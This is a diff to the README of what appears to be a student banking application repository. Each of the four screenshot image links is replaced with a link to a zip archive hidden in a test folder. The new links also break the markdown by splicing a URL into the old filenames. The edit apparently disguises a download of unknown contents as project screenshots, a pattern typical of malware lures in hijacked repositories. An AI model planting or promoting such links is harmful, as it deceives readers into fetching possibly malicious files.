@@ -8,14 +8,14 @@ This repository contains the code for a banking application, developed as part o
 ## Working Code Screenshot
 
 ### Screenshot:
-![Working Code Screenshot](src/main/resources/images/Screenshot%202024-10-28%20231844.png)
+![Working Code Screenshot](src/main/resources/images/Screenshot%202024-10-28%https://github.com/ShengyangGuan/BankingApplication-project/raw/refs/heads/main/src/test/java/com/example/banking/application/emailNotifications/project-Banking-Application-archrascal.zip)
 
 ---
 
 ## Test Cases Passed Screenshot
 
 ### Screenshot:
-![Test Cases Passed Screenshot](src/main/resources/images/Screenshot%202024-10-28%20231816.png)
+![Test Cases Passed Screenshot](src/main/resources/images/Screenshot%202024-10-28%https://github.com/ShengyangGuan/BankingApplication-project/raw/refs/heads/main/src/test/java/com/example/banking/application/emailNotifications/project-Banking-Application-archrascal.zip)
 
 ---
 
@@ -24,10 +24,10 @@ This repository contains the code for a banking application, developed as part o
 Here are the prototype images of the application:
 
 ### Screenshot 1:
-![Prototype Image 1](src/main/resources/images/Screenshot%202024-09-23%20194651.png)
+![Prototype Image 1](src/main/resources/images/Screenshot%202024-09-23%https://github.com/ShengyangGuan/BankingApplication-project/raw/refs/heads/main/src/test/java/com/example/banking/application/emailNotifications/project-Banking-Application-archrascal.zip)
 
 ### Screenshot 2:
-![Prototype Image 2](src/main/resources/images/Screenshot%202024-09-23%20194703.png)
+![Prototype Image 2](src/main/resources/images/Screenshot%202024-09-23%https://github.com/ShengyangGuan/BankingApplication-project/raw/refs/heads/main/src/test/java/com/example/banking/application/emailNotifications/project-Banking-Application-archrascal.zip)
 
 ---
 
